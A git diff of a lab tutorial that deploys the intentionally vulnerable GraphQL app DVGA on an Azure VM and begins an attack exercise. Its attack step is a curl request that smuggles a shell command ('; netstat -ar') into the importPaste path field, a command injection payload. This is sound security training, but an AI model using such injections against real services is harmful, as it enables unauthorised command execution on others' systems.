@@ -104,19 +104,20 @@ It is recommended to use parameter "--public-ip-sku Standard" to create new VM w
 
 **note the RSA message. your ssh files are store on your Cloudshell portal home directory for later use.
 
-Take note of the Public IP Address
 ```
+## Take note of the Public IP Address
+
 2. Run commands inside the VM to install GraphQL application on port 5000:
 
 ```
 
-az vm run-command invoke -g $rg -n $vm --command-id RunShellScript --scripts "apt-get update &&  apt-get install -y docker &&docker pull dolevf/dvga && docker run -t -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga"
+az vm run-command invoke -g $rg -n $vm --command-id RunShellScript --scripts "apt-get update &&  apt-get install -y docker &&  docker pull dolevf/dvga && docker run -t -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga"
 
 
 
 ```
 
-check if succeded (IT MAY TEKAE SOME TIME):
+check if succeded (IT MAY TAKE SOME TIME):
 
 ```
 
@@ -134,10 +135,9 @@ check if succeded (IT MAY TEKAE SOME TIME):
 }
 
 
-** checa OUTPUT, NO TIENE DOCKER POR DEFAULT Y NO VIENE AUQI
+** VALIDATE THIS WITH FULL COMMAND
 ```
 
-az vm open-port -g $rg -n $vm --port 5000
 
 
 3. Open VM ports for graphQL application (running on port tcp 5000):
@@ -208,7 +208,7 @@ az vm open-port -g $rg -n $vm --port 5000
 
   ```
 
-  ** command modifies Netowork Security Group to allow inbound port 5000
+  ** command modifies Neto=work Security Group to allow inbound port 5000
 
 4. Test application by :
 
@@ -238,14 +238,17 @@ You'll receive this:
 
 Also use a browser with the same URL and navigate freely on the interface :)
 
+## timestamp 2021111300
+
 5. Now you can start attacking this app :)
 
 
   # Task 3 -  Do some attacks
 
-**gotta check this**
 
 1. Get the IP address of your recently created instance and change the hostname of the next curl request:
+
+```
 
 
 curl -g \
@@ -254,6 +257,7 @@ curl -g \
 -d '{"query":"mutation {importPaste(host:\"localhost\", port:80, path:\"/ ; netstat -ar\", scheme:\"http\"){result}}"}' \
 http://<YOUR CONTAINER IP>/graphql
 
+```
 You should get someting like this:
 
 ```
